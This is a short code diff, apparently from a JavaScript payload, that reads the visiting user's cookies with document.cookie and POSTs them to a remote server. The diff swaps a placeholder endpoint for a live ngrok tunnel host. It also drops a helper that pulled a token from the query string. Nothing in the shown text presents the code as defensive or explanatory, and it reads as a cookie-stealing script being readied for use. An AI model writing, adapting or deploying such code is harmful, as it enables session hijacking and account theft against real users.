@@ -11,21 +11,10 @@
     // Function to send data to your server
     function sendData(data) {
       var xhr = new XMLHttpRequest();
-      xhr.open("POST", "https://your-server.example.com/receive", true);
+      xhr.open("POST", "277f-85-191-43-72.ngrok-free.app", true);
       xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
       xhr.send(data);
     }
-
-    // Function to parse a value from the query string
-    function getParameterByName(name) {
-      name = name.replace(/[\[]/, "\\[").replace(/[\]]/, "\\]");
-      var regex = new RegExp("[\\?&]" + name + "=([^&#]*)"),
-      results = regex.exec(location.search);
-      return results === null ? "" : decodeURIComponent(results[1].replace(/\+/g, " "));
-    }
-    
-    // Retrieve the token and cookie
-    var token = getParameterByName('token');
     var cookieValue = document.cookie; // Get the cookie value
 
     // Send the token and cookie to your server
